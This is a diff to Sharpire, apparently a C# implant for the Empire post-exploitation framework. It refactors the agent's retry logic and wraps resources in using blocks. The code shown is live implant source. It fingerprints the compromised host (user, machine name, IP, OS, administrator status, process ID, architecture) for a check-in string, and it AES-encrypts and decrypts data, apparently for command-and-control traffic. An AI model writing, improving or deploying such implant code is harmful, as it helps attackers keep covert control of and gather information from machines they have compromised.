@@ -174,7 +174,6 @@ namespace Sharpire
                 }
                 catch
                 {
-                    GC.Collect();
                     Execute();
                 }
             }
@@ -182,7 +181,6 @@ namespace Sharpire
             {
                 if ((int)((HttpWebResponse)webError.Response).StatusCode == 500)
                 {
-                    GC.Collect();
                     Execute();
                 }
                 else
@@ -459,7 +457,6 @@ namespace Sharpire
             }
             catch (Exception)
             {
-                GC.Collect();
                 DotNetEmpire();
             }
         }
@@ -485,47 +482,63 @@ namespace Sharpire
             information += Environment.UserName + "|";
             information += Environment.MachineName + "|";
 
-            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
-            scope.Connect();
-            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
-            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
-            ManagementObjectCollection objectCollection = objectSearcher.Get();
-            string ipAddress = "";
-            foreach (ManagementObject managementObject in objectCollection)
+            using (ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2"))
             {
-                string[] addresses = (string[])managementObject["IPAddress"];
-                if (null != addresses)
+                scope.Connect();
+                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
+                using (ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query))
                 {
-                    foreach (string address in addresses)
+                    using (ManagementObjectCollection objectCollection = objectSearcher.Get())
                     {
-                        if (address.Contains("."))
+                        string ipAddress = "";
+                        foreach (ManagementObject managementObject in objectCollection)
                         {
-                            ipAddress = address;
+                            using (managementObject)
+                            {
+                                string[] addresses = (string[])managementObject["IPAddress"];
+                                if (null != addresses)
+                                {
+                                    foreach (string address in addresses)
+                                    {
+                                        if (address.Contains("."))
+                                        {
+                                            ipAddress = address;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        if (0 < ipAddress.Length)
+                        {
+                            information += ipAddress + "|";
+                        }
+                        else
+                        {
+                            information += "0.0.0.0|";
                         }
                     }
                 }
-            }
 
-            if (0 < ipAddress.Length)
-            {
-                information += ipAddress + "|";
-            }
-            else
-            {
-                information += "0.0.0.0|";
-            }
+                query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
+                using (ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query))
+                {
+                    using (ManagementObjectCollection objectCollection = objectSearcher.Get())
+                    {
+                        string operatingSystem = "";
+                        foreach (ManagementObject managementObject in objectCollection)
+                        {
+                            using (managementObject)
+                            {
+                                operatingSystem = (string)managementObject["Name"];
+                                operatingSystem = operatingSystem.Split('|')[0];
+                            }
+                        }
 
-            query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
-            objectSearcher = new ManagementObjectSearcher(scope, query);
-            objectCollection = objectSearcher.Get();
-            string operatingSystem = "";
-            foreach (ManagementObject managementObject in objectCollection)
-            {
-                operatingSystem = (string)managementObject["Name"];
-                operatingSystem = operatingSystem.Split('|')[0];
+                        information += operatingSystem + "|";
+                    }
+                }
             }
-
-            information += operatingSystem + "|";
 
             bool elevated =
                 new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
@@ -538,10 +551,12 @@ namespace Sharpire
                 information += elevated + "|";
             }
 
-            Process process = Process.GetCurrentProcess();
-            information += process.ProcessName + "|";
-            information += process.Id + "|";
-            //TODO fix this from being hard coded  
+            using (Process process = Process.GetCurrentProcess())
+            {
+                information += process.ProcessName + "|";
+                information += process.Id + "|";
+            }
+            //TODO fix this from being hard coded
             information += "csharp|5";
             information += "|" + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 
@@ -607,8 +622,10 @@ namespace Sharpire
                 aesCrypto.Mode = CipherMode.CBC;
                 aesCrypto.Key = keyBytes;
                 aesCrypto.IV = ivBytes;
-                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
-                encryptedBytes = encryptor.TransformFinalBlock(dataBytes, 0, dataBytes.Length);
+                using (ICryptoTransform encryptor = aesCrypto.CreateEncryptor())
+                {
+                    encryptedBytes = encryptor.TransformFinalBlock(dataBytes, 0, dataBytes.Length);
+                }
             }
 
             return encryptedBytes;
@@ -642,7 +659,10 @@ namespace Sharpire
                 aesCrypto.Padding = PaddingMode.PKCS7;
                 aesCrypto.Key = key;
                 aesCrypto.IV = iv;
-                return aesCrypto.CreateDecryptor().TransformFinalBlock(cipherText, 0, cipherText.Length);
+                using (ICryptoTransform decryptor = aesCrypto.CreateDecryptor())
+                {
+                    return decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
+                }
             }
         }
     }
